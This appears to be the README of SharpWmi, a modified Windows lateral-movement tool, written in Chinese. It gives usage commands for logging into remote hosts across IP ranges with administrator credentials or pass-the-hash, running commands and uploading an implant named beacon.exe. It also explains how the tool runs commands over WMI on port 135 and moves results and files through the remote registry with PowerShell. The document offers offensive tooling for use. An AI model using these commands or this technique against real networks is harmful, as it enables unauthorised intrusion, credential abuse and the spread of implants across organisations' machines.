# SharpWmi

## 魔改
```bash

                sharpwmi.exe login 192.168.2.3 administrator 123 cmd whoami
                sharpwmi.exe login 192.168.2.3/24 administrator 123 cmd whoami
                sharpwmi.exe login 192.168.2.3-23 administrator 123 upload beacon.exe c:\beacon.exe
                sharpwmi.exe pth 192.168.2.3-192.168.2.77 cmd whoami
                sharpwmi.exe pth 192.168.2.3/255.255.255.0 upload beacon.exe c:\beacon.exe
```

## 介绍：

这是一个基于135端口来进行横向移动的工具,具有执行命令和上传文件功能,通过wmi来执行命令,通过注册表来进行数据传输.

## 原理:
### 执行命令：
   通过wmi来执行命令，server将命令结果存在本机注册表，然后client连接注册表进行读取命令结果

### 上传文件:
   client将需要上传的文件放到server的注册表里面，然后server通过powershell来操作注册表方式来取文件然后释放到本地


## 优点：
- 不依赖139和445端口

## 缺点：
- 目前只支持上传512kb以下的文件，因为注册表每个值值长度不能超过512kb。
- 执行命令和上传文件都依赖powershell

## todo:
- 用添加增加多个值的方式来实现上传任意大小文件
- 去除powershell依赖
![](2.png)
![](3.png)

